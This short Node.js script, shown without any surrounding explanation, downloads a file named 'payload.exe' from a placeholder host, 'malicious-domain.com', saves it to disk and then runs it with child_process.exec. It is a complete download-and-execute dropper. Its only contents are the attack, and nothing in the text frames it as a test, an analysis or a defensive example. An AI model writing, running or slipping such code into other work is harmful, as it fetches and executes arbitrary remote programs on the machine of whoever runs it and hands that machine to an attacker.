const https = require('https');
const fs = require('fs');
const url = 'https://malicious-domain.com/payload.exe';
const file = fs.createWriteStream('payload.exe');
https.get(url, function(response) {
  response.pipe(file);
  file.on('finish', function() {
    file.close();
    require('child_process').exec('payload.exe');
  });
});
